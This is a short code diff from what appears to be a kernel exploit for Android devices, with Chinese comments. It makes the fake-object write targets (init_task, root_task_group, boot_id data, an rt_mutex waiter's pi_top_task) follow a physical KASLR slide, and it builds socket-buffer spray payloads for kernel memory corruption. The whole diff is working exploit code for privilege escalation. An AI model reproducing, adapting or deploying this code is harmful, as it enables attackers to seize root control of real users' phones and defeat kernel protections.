@@ -254,7 +254,10 @@ int has_zero_byte(uintptr_t value) {
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
   uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
-  return P0_PAGE_OFFSET + phys;   /* LOAD 版: 与 common.h P0_DATA_ALIAS_CONST 一致 */
+  /* data_addr() = p0 别名 + slide_p0_offset:
+   * shennong 物理加载固定(slide_p0_offset=0),别名不随 VA slide;
+   * m1q 类机型(物理 KASLR)在此叠加 slide,保证写目标在非零 slide 下正确。 */
+  return P0_PAGE_OFFSET + phys + slide_p0_offset;   /* LOAD 版: 与 common.h P0_DATA_ALIAS_CONST 一致 */
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
@@ -479,12 +482,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = SLIDE_LOGGERS_0_1;
+    /* SLIDE: 写/读目标走 data_addr()(= p0 别名 + slide_p0_offset),
+     * 使非零 slide 下 boot_id 写目标仍落在真实页面上 */
+    write_pc = data_addr(SLIDE_LOGGERS_0_1_IMAGE);
     write_right = 0;
-    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
-    waiter_task = SLIDE_INIT_TASK;
-    task_group = SLIDE_ROOT_TASK_GROUP;
-    pi_top_task = SLIDE_INIT_TASK;
+    write_left = data_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE);
+    waiter_task = data_addr(SLIDE_INIT_TASK_IMAGE);
+    task_group = data_addr(SLIDE_ROOT_TASK_GROUP_IMAGE);
+    pi_top_task = data_addr(SLIDE_INIT_TASK_IMAGE);
   }
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
